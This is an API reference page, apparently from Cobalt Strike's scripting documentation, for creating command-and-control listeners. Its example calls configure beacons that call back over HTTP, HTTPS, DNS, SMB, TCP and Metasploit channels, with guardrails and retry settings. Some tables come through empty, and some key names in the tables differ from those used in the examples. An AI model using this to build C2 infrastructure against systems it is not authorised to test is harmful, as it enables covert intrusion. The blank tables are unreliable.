listener_create_ext

Create a new listener.

#### Arguments

`$1` - the listener name. Valid characters are alphabetic (a-z and A-Z), numeric (0-9), dash (-), period (.), and underscore (_). The name cannot start or end with a period (.).

`$2` - the payload (e.g., windows/beacon_http/reverse_http)

`$3` - a map with key/value pairs that specify options for the listener

#### Note

The following payload options are valid for `$2`:

| Type |  |
| --- | --- |
| Beacon DNS |  |
| Beacon HTTP |  |
| Beacon HTTPS |  |
| Beacon SMB |  |
| Beacon TCP |  |
| External C2 |  |
| Foreign HTTP |  |
| Foreign HTTPS |  |

The following keys are valid for `$3`:

| DNS | Ext C2 | Foreign (HTTP/S) | HTTP/S | SMB | TCP (Bind) |  |
| --- | --- | --- | --- | --- | --- | --- |
|  |  |  | HTTP Host Header |  |  |  |
| bind port |  |  | bind port |  |  |  |
| c2 hosts | bind host |  | c2 hosts |  | bind host |  |
| dns resolver |  |  |  |  |  |  |
| guardrails |  |  | guardrails | guardrails | guardrails |  |
| staging host |  | foreign host | staging host |  |  |  |
|  | localonly |  |  |  | localonly |  |
| maxretry |  |  | maxretry |  |  |  |
| c2 port | port | c2 port | c2 port | pipe name | port |  |
| profile variant |  |  | profile variant |  |  |  |
|  |  |  | proxy config |  |  |  |
| host rotation |  |  | host rotation |  |  |  |

The following host rotation Values are valid for the 'strategy' Key:

|  |
| --- |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |
|  |

#### Note

The guards value uses positional tab delimited syntax (\t) to specify the IP Address, User Name, Server Name, and Domain guardrail settings. For example, if you want to only set the User Name and Server Name settings use the following key/value pair guards:

```
 => “\tfoo*\t*bar” ```

In this case the first \t character sets the IP Address to nothing, foo*\t sets the User Name, *bar sets the Server Name, and since this is the end of the string the Domain is set to nothing. See the *Example* section for an example that sets all guardrail settings.

The localonly value sets how the TCP or External C2 listener port binds to the host. When this setting is set to **true** then the beacons value needs to be set to **127.0.0.1**. If the value is set to **false** then the beacons value needs to be set to **0.0.0.0**.

The maxretry value uses the following syntax of exit-[max_attempts]-[increase_attempts]-[duration][m,h,d]. For example, exit-10-5-5m will exit beacon after 10 failed attempts and will increase sleep time after 5 failed attempts to 5 minutes. The sleep time will not be updated if the current sleep time is greater than the specified duration value. The sleep time will be affected by the current jitter value. On a successful connection the failed attempts count will be reset to zero and the sleep time will be reset to the prior value.

The proxy configuration string is the same string you would input into Cobalt Strike's listener dialog. `*direct*` ignores the local proxy configuration and attempts a direct connection. `protocol://user:[email protected]:port` specifies which proxy configuration the artifact should use. The `username` and `password` are optional (e.g., `protocol://host:port` is fine). The acceptable protocols are `socks` and `http`. Set the proxy configuration string to `$null` or `""` to use the default behavior.

#### Example

```

# Create a simple HTTP listener, with guardrails
listener_create_ext("Beacon-HTTP", "windows/beacon_http/reverse_http",
  %(host => "www.losenolove.com", port => 80,
  beacons => www.losenolove.com,www2.losenolove.com,
  guards => "198.178.*.*\tfoo*\t*bar\t*love.com"));

# Create a detailed HTTPS listener
listener_create_ext("Beacon-HTTPS", "windows/beacon_https/reverse_https",
  %(host => "stage.host", port => 443,
  beacons => "b1.host,b2.host",
  althost => "alt.host",
  bindto => 8443,
  profile => "default",
  strategy => "failover-5x",
  maxretry => "exit-10-5-5m",
  proxy => "proxy.host"));

# Create a DNS listener
listener_create_ext("Beacon-DNS", "windows/beacon_dns/reverse_dns_txt",
  %(host => "freestuff.com", port => 53,
  beacons => "freestuff.com,freepics.com,freemov.com",
  bindto => 853,
  profile => "default",
  strategy => "failover-5x",
  maxretry => "exit-10-5-5m"));

# Create a SMB listener
listener_create_ext("Beacon-SMB", "windows/beacon_bind_pipe",
  %(port => "mypipe",
  profile => ""));

# Create a TCP listener for localhost only
listener_create_ext("Beacon-TCP-Local", "windows/beacon_bind_tcp",
  %(beacons => "127.0.0.1", port => 12345,
  localonly => "true",
  profile => ""));

# Create a TCP listener for external hosts
listener_create_ext("Beacon-TCP", "windows/beacon_bind_tcp",
  %(beacons => "0.0.0.0", port => 54321,
  localonly => "false",
  profile => ""));

# Create an External C2 listener for localhost only
listener_create_ext("Beacon-ExtC2-Local", "windows/beacon_extc2",
  %(beacons => "127.0.0.1", port => 3333,
  localonly => "true",
  profile => ""));

# Create an External C2 listener for external hosts
listener_create_ext("Beacon-ExtC2", "windows/beacon_extc2",
  %(beacons => "0.0.0.0", port => 4444,
  localonly => "false",
  profile => ""));

# Create a Foreign HTTP listener
listener_create_ext("Metasploit-HTTP", "windows/foreign/reverse_http",
  %(host => "ads.losenolove.com", port => 80,
  profile => ""));

# Create a Foreign HTTPS listener
listener_create_ext("Metasploit-HTTPS", "windows/foreign/reverse_https",
  %(host => "ads.losenolove.com", port => 443,
  profile => ""));
```

